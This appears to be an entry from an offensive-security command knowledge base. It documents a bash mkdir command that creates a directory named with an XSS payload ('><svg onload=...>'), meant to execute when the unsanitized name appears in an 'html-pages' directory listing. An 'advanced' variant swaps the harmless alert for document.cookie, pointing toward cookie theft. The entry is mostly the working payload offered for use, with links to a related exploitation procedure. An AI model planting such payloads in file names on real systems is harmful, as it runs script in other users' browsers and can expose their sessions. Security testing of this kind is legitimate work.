---
id: cmd-uuid-2
data: mkdir "><svg onload=alert(5);>
tags:
  - filesystem
  - xss
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T03:16:02.804Z'
verified: false
validated: true
submitted: true
---
# mkdir-malicious-directory

## Command

```bash
mkdir "><svg onload=alert(5);>
```

## Description

Creates a directory with a name containing a JavaScript XSS payload, which will be unsanitized in html-pages listings.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `"><svg onload=alert(5);>` | Malicious directory name with payload | Yes |

## Examples

### Basic Usage

```bash
mkdir "><svg onload=alert(5);>
```

### Advanced Usage

```bash
mkdir -p "><svg onload=alert(document.cookie);> /path
```

## Expected Output

No output if successful; use `ls` to confirm directory creation.

## Related

- [[procedures/Create-Malicious-Directory-for-XSS]]
- [[commands/html-pages-start-server]]
